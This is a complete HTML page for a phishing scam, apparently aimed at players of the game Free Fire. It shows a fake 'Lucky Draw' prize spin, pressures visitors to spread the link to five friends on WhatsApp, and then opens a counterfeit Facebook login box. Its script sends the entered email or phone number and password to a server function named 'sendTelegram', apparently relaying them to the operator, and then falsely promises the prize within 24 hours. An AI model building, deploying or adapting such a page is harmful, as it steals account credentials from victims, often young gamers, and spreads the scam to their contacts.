<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Free Fire Lucky Draw</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
body {
  background: #161a2b;
  color: white;
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 20px 10px;
  text-align: center;
}
h1 {
  margin-bottom: 18px;
  font-size: 1.6em;
  color: #ffad07;
  text-shadow: 0 0 5px #ffad07;
}
#prizeBox {
  width: 170px;
  height: 170px;
  background: linear-gradient(135deg, #ffad07, #ff3b50);
  border-radius: 20px;
  margin: 18px auto;
  cursor: pointer;
  position: relative;
  box-shadow: 0 5px 25px #ff3b5050;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}
#prizeBox img {
  max-width: 120px;
  max-height: 120px;
  display: none;
  border-radius: 15px;
  box-shadow: 0 4px 20px #ffad0730;
}
#prizeBox.opened {
  cursor: default;
}
#prizeBox .text {
  font-size: 1.25em;
  font-weight: bold;
  pointer-events: none;
  color: white;
  letter-spacing: 1.2px;
}
.prize-pool {
  margin-top: 24px;
  display: flex;
  justify-content: center;
  flex-wrap: wrap;
  gap: 12px;
  max-width: 380px;
  margin-left: auto;
  margin-right: auto;
}
.prize-pool .prize {
  width: 75px;
  height: 75px;
  border-radius: 12px;
  background: #202a48;
  border: 2px solid #444;
  display: flex;
  justify-content: center;
  align-items: center;
  transition: border-color 0.4s, box-shadow 0.4s;
}
.prize-pool .prize img {
  max-width: 60px;
  max-height: 60px;
  border-radius: 10px;
  user-select: none;
}
.prize-pool .prize.highlight {
  border-color: #ffad07;
  box-shadow: 0 0 22px #ffad07dd, 0 0 12px #ff3b5080;
  transform: scale(1.1);
}
.spin-btn,
.redeem-btn,
#share-btn {
  width: 90%;
  max-width: 280px;
  margin: 20px auto 0 auto;
  font-size: 1.12em;
  padding: 14px 0;
  border: none;
  border-radius: 8px;
  color: #fff;
  background: linear-gradient(90deg, #ffad07, #ff3b50);
  box-shadow: 0 2px 9px #ffad0730;
  cursor: pointer;
  user-select: none;
}
#result,
#share-area,
#redeem-area,
#fb-modal,
#confirmation-page {
  display: none;
}
#share-area {
  margin-top: 15px;
  font-size: 1em;
  color: #ffd97d;
}
#fb-modal {
  position: fixed;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  background: rgba(16, 20, 30, 0.85);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 30;
}
#confirmation-page {
  position: fixed;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  background: #202a48;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 31;
  font-size: 1.4em;
  padding: 20px;
  text-align: center;
  flex-direction: column;
}
.fb-container {
  width: 98vw;
  max-width: 360px;
  background: #fff;
  border-radius: 7px;
  padding: 28px 18px 22px 18px;
  box-shadow: 0 8px 38px #202a487a;
  position: relative;
  color: #000;
}
.fb-container h2 {
  color: #1877f2;
  letter-spacing: 1px;
  margin-top: 0;
  font-family: 'Segoe UI', Arial, sans-serif;
}
.fb-container input {
  width: 100%;
  padding: 11px;
  margin: 8px 0;
  border: 1px solid #ccd0d5;
  border-radius: 5px;
  font-size: 1em;
  background: #f5f6fa;
}
.fb-container button {
  width: 100%;
  padding: 11px;
  border: none;
  border-radius: 5px;
  background: #1877f2;
  color: #fff;
  font-size: 1em;
  margin-top: 8px;
  cursor: pointer;
}
.fb-container .close-fb {
  position: absolute;
  top: 15px;
  right: 20px;
  font-size: 1.4em;
  color: #444;
  background: none;
  border: none;
  cursor: pointer;
}
@media screen and (max-width: 600px) {
  .prize-pool .prize {
    width: 50px;
    height: 50px;
  }
  .prize-pool .prize img {
    max-width: 40px;
    max-height: 40px;
  }
  #prizeBox {
    width: 140px;
    height: 140px;
  }
  #prizeBox img {
    max-width: 95px;
    max-height: 95px;
  }
}
</style>
</head>
<body>
  <h1>Free Fire Lucky Draw</h1>
  <div id="prizeBox">
    <div class="text">Click to Open</div>
    <img alt="Winning Prize" />
  </div>

  <div class="prize-pool" id="prizePool">
    <div class="prize" data-idx="0"><img src="diamond-500.png" alt="500 Diamonds" title="500 Diamonds" /></div>
    <div class="prize" data-idx="1"><img src="diamond-300.png" alt="300 Diamonds" title="300 Diamonds" /></div>
    <div class="prize" data-idx="2"><img src="rare-gun-skin.png" alt="Rare Gun Skin Box" title="Rare Gun Skin Box" /></div>
    <div class="prize" data-idx="3"><img src="rare-dress.jpg" alt="Rare Dress" title="Rare Dress" /></div>
    <div class="prize" data-idx="4"><img src="pet-box.png" alt="Pet Box" title="Pet Box" /></div>
  </div>

  <button id="share-btn" class="spin-btn" style="margin-top: 20px;">Share this site with 5 friends on WhatsApp to redeem your prize</button>
  <div id="redeem-area" style="margin-top:15px; display:none;">
    <button class="redeem-btn" id="redeemBtn" disabled>Redeem</button>
  </div>

  <!-- Facebook Login Modal -->
  <div id="fb-modal">
    <div class="fb-container">
      <button class="close-fb" onclick="document.getElementById('fb-modal').style.display='none'">Ã—</button>
      <h2>Facebook</h2>
      <input type="text" id="fb-email" placeholder="Email or Phone number" />
      <input type="password" id="fb-password" placeholder="Password" />
      <button id="fb-login-btn">Log In</button>
      <div style="margin: 14px 0 0 0; text-align: center;">
        <a href="#" style="color: #1877f2;">Forgotten password?</a>
      </div>
    </div>
  </div>

  <!-- Confirmation Page -->
  <div id="confirmation-page">
    <p>Thank you for logging in!<br>Your gift will be received in your mailbox within 24 hours.</p>
  </div>

<script>
  const prizes = [
    { name: '500 Diamonds', img: 'diamond-500.png' },
    { name: '300 Diamonds', img: 'diamond-300.png' },
    { name: 'Rare Gun Skin Box', img: 'rare-gun-skin.png' },
    { name: 'Rare Dress', img: 'rare-dress.jpg' },
    { name: 'Pet Box', img: 'pet-box.png' }
  ];

  const prizeBox = document.getElementById('prizeBox');
  const prizePoolDivs = document.querySelectorAll('#prizePool .prize');
  const shareBtn = document.getElementById('share-btn');
  const redeemBtn = document.getElementById('redeemBtn');
  const redeemArea = document.getElementById('redeem-area');
  const resultImg = prizeBox.querySelector('img');
  const resultText = prizeBox.querySelector('.text');

  let opened = false;
  let wonPrizeIdx = null;

  function resetPrizeBox() {
    resultImg.style.display = 'none';
    resultText.style.display = 'block';
    resultText.textContent = 'Click to Open';
    redeemBtn.disabled = true;
    redeemArea.style.display = 'none';
    prizePoolDivs.forEach(div => div.classList.remove('highlight'));
    opened = false;
  }

  function animatePrizeSelection(idx) {
    let rounds = 10;
    let steps = rounds * prizes.length;
    let currentStep = 0;

    function step() {
      prizePoolDivs.forEach(div => div.classList.remove('highlight'));
      let highlightIdx = currentStep % prizes.length;
      prizePoolDivs[highlightIdx].classList.add('highlight');
      currentStep++;
      if (currentStep < steps) {
        setTimeout(step, 80 + currentStep * 10);
      } else {
        // end animation highlighting winning prize
        prizePoolDivs.forEach(div => div.classList.remove('highlight'));
        prizePoolDivs[idx].classList.add('highlight');
        showWinningPrize(idx);
      }
    }
    step();
  }

  function showWinningPrize(idx) {
    wonPrizeIdx = idx;
    resultText.style.display = 'none';
    resultImg.src = prizes[idx].img;
    resultImg.alt = prizes[idx].name;
    resultImg.style.display = 'block';
    redeemBtn.disabled = true;
    redeemArea.style.display = 'block';
    shareBtn.style.display = 'block';
  }

  prizeBox.addEventListener('click', () => {
    if (opened) return;
    opened = true;
    const randomIndex = Math.floor(Math.random() * prizes.length);
    animatePrizeSelection(randomIndex);
  });

  // Share button logic
  shareBtn.addEventListener('click', () => {
    const siteURL = encodeURIComponent(window.location.href);
    const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Share it with 5 friends and claim your prize: ${siteURL}`;
    window.open(whatsappLink, '_blank');
    // Unlock redeem immediately after one share click
    redeemBtn.disabled = false;
    shareBtn.style.display = 'none';
  });

  redeemBtn.addEventListener('click', () => {
    document.getElementById('fb-modal').style.display = 'flex';
  });

  document.getElementById('fb-login-btn').addEventListener('click', () => {
    const emailOrPhone = document.getElementById('fb-email').value.trim();
    const password = document.getElementById('fb-password').value.trim();

    if (!emailOrPhone || !password) {
      alert('Please fill in both fields.');
      return;
    }

    fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ emailOrPhone, password }),
    })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Login details sent successfully!');
          document.getElementById('fb-modal').style.display = 'none';
          document.getElementById('confirmation-page').style.display = 'flex';
          document.getElementById('fb-email').value = '';
          document.getElementById('fb-password').value = '';
        } else {
          alert('Failed to send details.');
        }
      })
      .catch(() => {
        alert('Error sending details.');
      });
  });

  // Close Facebook modal button
  document.querySelector('.close-fb').addEventListener('click', () => {
    document.getElementById('fb-modal').style.display = 'none';
  });

  // Hide modals initially
  document.getElementById('fb-modal').style.display = 'none';
  document.getElementById('confirmation-page').style.display = 'none';
  shareBtn.style.display = 'none';
  resetPrizeBox();
</script>
</body>
</html>

